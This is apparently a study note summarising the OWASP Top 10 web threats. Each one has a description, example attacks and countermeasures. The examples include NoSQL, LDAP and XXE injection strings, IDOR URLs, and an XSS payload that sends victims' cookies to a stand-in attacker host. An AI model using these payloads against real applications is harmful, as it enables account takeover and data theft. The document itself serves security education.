# OWASP top 10 threats

- [OWASP](https://owasp.org/): open community dedicated for application security.
- [OWASP Community Pages](https://owasp.org/www-community/): Wiki including controls, attacks, vulnerabilities for applications.
- [OWASP Top 10](https://owasp.org/www-project-top-ten/): Describes top 10 application security threats.
- 💡 [OWASP WebGoat](https://owasp.org/www-project-webgoat/) is a deliberately insecure application to test top 10 vulnerabilities.
- 📝 Ordered from most common to least
  1. [Injection](#injection)
  2. [Broken authentication](#broken-authentication)
  3. [Sensitive data exposure](#sensitive-data-exposure)
  4. [XML external entities](#xml-external-entities-xxe)
  5. [Broken access control](#broken-access-control)
  6. [Security misconfiguration](#security-misconfiguration)
  7. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
  8. [Insecure deserialization](#insecure-deserialization)
  9. [Using components with known vulnerabilities](#using-components-with-known-vulnerabilities)
  10. [Insufficient logging and monitoring](#insufficient-logging-and-monitoring)

## Injection

- Injecting malicious data into commands and queries to execute in the application
- Targets input fields or entry points of the application
- The first on OWASP's top 10 list
- Very common as any source of data can be an injection vector.

### Types of injection attacks

#### Code injection

- General term for attack types which consist of injecting code that is then interpreted/executed by the application
- Exploits poor handling of untrusted data.
- 📝 According to [OWASP](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.html) it targets on server-side scripting engines, e.g. ASP or PHP
  - However, according to [Wikipedia code injection](https://en.wikipedia.org/wiki/Code_injection) also includes non server-side scripting engines such as [Cross Site Scripting](#cross-site-scripting-xss) and [SQL injection](./../14-sql-injection/sql-injection-overview.md)
- ❗ Not same as [Command injection](#command-injection)
  - Code injection leverages existing code to execute commands.
    - E.g. if PHP code injected, it's only limited by limited by what PHP is capable of.
  - Command injection runs system commands on underlying OS.

#### NoSQL injection

- Like SQL injection but targets NoSQL databases
- E.g. MongoDB login bypass
  - Assume back-end is vulnerable:

    ```json
        // NodeJS with Express.js
      db.collection('users').find({
        "user": req.query.user,
        "password": req.query.password
      });
    ```

  - Sending `https://cloudarchitecture.io/login?user=patrick&password[%24ne]=`would cause:
    - `"password: { "&ne": "" }` (not equal empty)

#### LDAP injection

- LDAP is a protocol used to access and maintain directory services over IP
  - Read more about [LDAP](#ldap-injection)
- E.g. using **`&`** to end to query
  - Application code: `String filter = "(&(USER = " + user_name + ") (PASSWORD = " + user_password + "))";`
  - Attacker enters appends `)(&)` after user name like: `johnDoe)(&)`
  - Attacker gets access as `&` ends the query and always evaluates to `true`.

#### SOAP injection

- A type of XML injection as SOAP uses XML (eXtensible Markup Language) to represent the data.
- SOAP is a protocol used for web services to exchange structured information.
- 📝 It communicates over usually on HTTP but in some legacy applications also SMTP.
- E.g. injecting an additional `<FundsCleared>True</FundsCleared>`, in a bank application

#### Command injection

- **Shell injection**
  - Applies to web applications that programmatically execute a command line
- **File injection**
  - E.g. exploiting by causing an application to run/show a malicious remote file
- **HTML embedding**
  - Refers to [Cross Site Scripting (XSS)](#cross-site-scripting-xss)

#### SQL injection

- See [SQL injection](./../14-sql-injection/sql-injection-overview.md)

### Countermeasures for injection

- Input validation
- Customized error messages
- Monitoring database traffic
- Limit length of user input

## Broken authentication

- Threats and vulnerabilities in authentication and session management
- Exploited to impersonate targets
- Vulnerabilities include
  - Exposing session IDs in urls
  - Session IDs not being rotated (changed)
  - Weak or ineffective credential recovery and forgot-password processes
  - Plain text, encrypted, or weakly hashed passwords
  - Ineffective [multi-factor authentication (MFA)](./../01-introduction/identity-access-management-(iam).md#multi-factor-authentication-mfa)
  - Improperly set timeouts (does not invalidate session during e.g. user inactivity or log out)

### Example attacks for broken authentication

- **Credential stuffing**
  - Automated injection of breached username/password pairs
  - E.g. using [list of known passwords](https://github.com/danielmiessler/SecLists)
- An attacker can use old users browser while the user is still authenticated but not using his/her computer.

### Countermeasures for broken authentication

- Use [MFA (multi-factor authentication)](./../01-introduction/identity-access-management-(iam).md#multi-factor-authentication-mfa) where possible to prevent e.g. automated and brute-force attacks.
- Do not ship or deploy with any default credentials
- Implement weak-password checks, such as testing new or changed passwords against a list of the top 10000 worst passwords.
- Use NIST standard password length, complexity and rotation policies
- Harden pathways against account enumeration attacks by using the same messages for all outcomes.
- Limit or increasingly delay failed login attempts.
- Log failures and alert when attacks are detected.
- Use server-side, randomized session ID generation after login.

## Sensitive data exposure

- Exploits weak encryption code.

### Example attacks for sensitive data exposure

- SQL injection flaw to retrieve credit card numbers in clear text as they're not encrypted in transit.
- Downgrading from HTTPS to HTTP to intercept requests
- Pre-calculating hashes with simple (or) fast hash algorithms to find out passwords in clear text from a hashed database.

### Countermeasures for sensitive data exposure

- Classify data (sensitive etc.) and apply controls as per the classification.
- Don't store sensitive data unnecessarily
- Encrypt data in transit and at rest
- Ensure up-to-date and strong standard algorithms, protocols, and keys are in place
- Use proper key management (rotate to not reuse same keys)
- Disable caching of sensitive data

## XML External Entities (XXE)

- Takes advantage of a poorly configured XML parser
- Allows attackers to cause DoS and access local or remote files
- Applications with improper XML validation or insecure XML processors are vulnerable.

### Example attacks for XML External Entities (XXE)

- Local files: Injecting `<!ENTITY xxe SYSTEM "file:///dev/password" >]>` shows `dev/password` file
- Probing local network: `<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>`

### Countermeasures for XML External Entities (XXE)

- Use less complex data formats such as JSON
- Patch or upgrade all XML processors (at least SOAP 1.2) and libraries and underlying operating system.
- Disable XML external entity and DTD processing in all XML parsers
- Implement proper server-side input validation

## Broken access control

- Threats and vulnerabilities in access control.
- Exploited to evade the authentication and gain admin privileges.

### Attacks for broken access control

- 📝 Elevation of privilege by e.g. acting as an admin as user or when not logged in.
- Metadata manipulation such as tampering JSON Web Token (JWT) access control tokens
- CORS misconfigurations to do an unauthorized API access.
- Accessing API with missing access controls for POST, PUT and DELETE.

### Insecure direct object references (IDOR)

- 📝 Direct access to internal objects through URL without authorization checks
- E.g. `cloudarchitecture.io/change_password.php?userId=victimUsername` to reset victims password

#### Missing Function Level Access Control

- Bypassing access control checks by modifying the URL
- E.g. reaching admin panel by modifying `cloudarchitecture.io/appInfo` to `cloudarchitecture.io/adminAppInfo`s

### Countermeasures for broken access control

- Only use server-side code (or serverless API) for access control
- Re-use access controls throughout the application
- Minimize CORS usage.
- Access controls should enforce record ownership per for data being deleted/altered
- Rate limiting APIs and controllers to minimize harm from automated attacks
- Invalidate JWT tokens after server logout
- Unit and integration tests for functional access control

## Security misconfiguration

- Exploits poorly configured application stack.

### Vulnerabilities of Security misconfiguration

- Incomplete or ad hoc configurations
- Open cloud storage
- Misconfigured HTTP headers
- Verbose error messages containing sensitive information
- Default configurations
- Unnecessary services / unused services
- Unprotected files and directories
- Unpatched flaws

### Countermeasures of Security misconfiguration

- Configure development, QA, and production environments identically with different credentials.
- Minimal platform without any unnecessary features, components, documentation, and samples.
- Review and update the configurations as part of patch management
  - Especially review cloud storage permissions (e.g. S3 bucket permissions)
- Segmentation (separation between components) through containerization or cloud security groups (ACLs)
- Send security directives to clients, e.g. [security headers](https://securityheaders.com/)
- Automated process to verify the effectiveness of the configurations and settings in all environments

#### Security hardening

- Securing a system by reducing its surface of vulnerability
- In principle a single-function system is more secure than a multipurpose one
- E.g. changing default passwords, the removal of unnecessary software, unnecessary usernames or logins, and the disabling or removal of unnecessary services.
- See [privacy.sexy](https://privacy.sexy) for open-source security hardening on Windows.

### Attacks of Security misconfiguration

- Attacker recognizes that sample application is left on application server
  - Attacker logs in to the server through its admin console and default password.
- Attacker recognizes directory listing is not disabled on the server.  
  - Attacker lists directories on a server
  - Attacker downloads source code to decompile them to look for access control flaws.
- Attacker checks error messages to see component versions and looks for vulnerabilities in them.

## Cross-Site Scripting (XSS)

- Also known as **cross site scripting**
- 📝 Taking untrusted data and sending it without input validation or escaping
- 📝 Type of client-side [code injection](#code-injection)
- Used to
  - hijack user sessions
  - deface web sites
  - redirect the user to malicious  sites
  - bypass controls such as same-origin policy

### Types of Cross-Site Scripting (XSS)

- **Reflected XSS**
  - Application or API includes unvalidated and unescaped user input as part of HTML output.
  - Allows attacker to execute arbitrary HTML and JavaScript in victims browser.
  - Enables attacker to show malicious link to user to point to an attacker-controlled page.
- **Stored XSS**
  - Application or API stores unsanitized user input that is viewed at a later time.
- **DOM XSS**
  - Vulnerability of JavaScript frameworks, SPAs and APIs that include attacker-controllable data to a page.
  - Application shouldn't send attacker-controllable data to unsafe JavaScript APIs.

### Threats of Cross-Site Scripting (XSS)

- Session stealing
- Account takeover
- [MFA](./../01-introduction/identity-access-management-(iam).md#multi-factor-authentication-mfa) bypass
- DOM node replacement or defacement (such as trojan login panels)
- Attacks against the user's browser such as malicious software download
- Key logging

### Example attacks for Cross-Site Scripting (XSS)

- Application sets value of an HTML parameter to an input without proper validation/sanitization

  ```html
    page += "<input name='credit-card' type='TEXT'
    value='" + request.getParameter("CC") + "'>";
  ```

- Attacker can then modify CC parameter in browser to: `'><script>document.location=
'http://attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.`
- More examples are at [XSS filter evasion cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
  - ❗ However must of them gets detected and filtered by Chrome or Firefox.
  - 💡 Can test if the injection will be successful on e.g. [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)

### Countermeasures for Cross-Site Scripting (XSS)

- Enable Content Security Policy (CSP) as a defense-in-depth mitigating control against XSS.
  - Only allows executing scripts from permitted domains.
- Filter input on arrival
- Set `HttpOnly` flag set for session cookies so they cannot be reached through JavaScript.
- 📝 Escape HTML code
  - Escape untrusted HTTP request data based on the context in the HTML output
  - Use frameworks that automatically escape XSS by design
  - Apply context-sensitive encoding
    - Encoding of HTML and JavaScript is different when modifying them based on user data

## Insecure deserialization

- Exploited by injecting malicious code into serialized data.
- Allows attacker to gain access through execution of malicious serialized data.
- Serialization can be used in e.g. caches, databases, HTTP cookies, authentication tokens..

### Attacks for insecure deserialization

- Object and data structure related attacks
  - Attacker modifies application logic or achieves remote code execution
- Data tampering attacks
  - E.g. access-control-related attacks where data content is changed
    - E.g. changing `role: user` to `role: admin`
  - Other serialization attack

### Countermeasures for insecure deserialization

- Do not accept serialized objects from untrusted sources
- Use serialization medium only for primitive data types such as `JSON`.
- Alternatively
  - Implementing integrity checks such as digital signatures against data tampering
  - Enforce strict type constraints
  - Isolate running deserialization logic in low privilege environments
  - Log deserialization exceptions and failures e.g. type mismatches or exceptions.
  - Restrict or monitor network traffic that deserializes.
  - Alert if a user deserializes constantly

## Using components with known vulnerabilities

- Components include libraries, frameworks.
- Risk is big as they run with same privileges as the applications.
- Common in internet of things (IoT) as they are difficult (or impossible) to patch.
- Can be easily exploited by automated tools.

### Weaknesses for using components with known vulnerabilities

- Not knowing versions of used components and nested dependencies.
- If software is vulnerable, unsupported, or out of date.
- Fixing, upgrading platforms in a timely fashion for change control (e.g. once a month)
- Not testing compatibility of changed libraries
- Not securing component configurations. See: [security misconfiguration](#security-misconfiguration)

### Attack examples for using components with known vulnerabilities

- [CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638), remote code execution vulnerability that caused some breaches.
- [Shodan IoT Search Engine](https://www.shodan.io/report/89bnfUyJ) can show IoT devices that are still vulnerable to [Heartbleed](https://heartbleed.com/)
  - See also [Shodan | Footprinting](./../02-footprinting/search-engines-and-online-resources.md#shodan)

### Countermeasures for using components with known vulnerabilities

- Scan for vulnerabilities regularly
- Subscribe to security bulletins related to the components you use.
- Patch management process to remove unused dependencies, features, components, files, and documentation.
- Only obtain components from from official sources over secure links, prefer signed packages.
- Monitor for libraries and components that are unmaintained or do not create security patches
- Continuously inventory the versions of both client-side and server-side components and their versions.

## Insufficient logging and monitoring

- 🤗 [Most breach studies](https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?htmlfid=SEL03130WWEN&) show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring

### Weaknesses for insufficient logging and monitoring

- Storing logs only locally
- Unclear logs
- No monitoring of logs for suspicious activity
- Missing/ineffective incident response
- Not triggering alerts on e.g. security scans

### Countermeasures for insufficient logging and monitoring

- Ensure logs have a format that can be consumed in a centralized log management solutions
- Establish or adopt an incident response and recovery plan
- Ensure all suspicious (login, RBAC, input failures) activities are logged with sufficient user context.
- Prevent tampering or deletion of log e.g. by using append-only database
- Ensure that suspicious activities are detected and responded to in a timely fashion.
